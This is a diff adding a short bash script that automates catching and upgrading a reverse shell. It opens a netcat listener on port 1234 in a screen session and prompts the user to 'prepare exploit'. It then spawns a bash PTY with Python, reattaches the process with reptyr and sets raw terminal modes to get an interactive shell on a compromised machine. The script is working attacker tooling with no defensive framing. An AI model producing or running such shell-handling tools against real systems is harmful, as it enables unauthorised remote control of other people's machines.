@@ -1,0 +1,26 @@
+#!/bin/bash
+#This will spawn a reverse shell in screen then suspend the process and background it and bring it to the terminal window in use.
+#may need to play with the exports and stty rows and timing to get fully working.
+#Depenencies reptyr
+
+#sudo apt-get install reptyr #run this first time to install.
+screen -dmS shell
+#set port
+#PORT=$(($RANDOM+3000))
+#export PORT=$PORT
+screen -r shell -p 0 -X stuff "nc -lvp 1234^M"
+read -n 1 -r -s -p $'Prepare exploit then Press enter to continue...\n'
+screen -r shell -p 0 -X stuff "python -c 'import pty;pty.spawn(\"/bin/bash\")'^M"
+sleep 2
+echo "connecting... Press enter in 2 seconds"
+screen -r shell -p 0 -X stuff "^zbg^M"
+sleep 1
+screen -r shell -p 0 -X stuff "disown %1^M"
+reptyr $(pgrep nc)
+sleep 1
+stty raw -echo
+fg
+reset
+export TERM=xterm-256color
+export SHELL=bash
+stty rows 52 columns 235
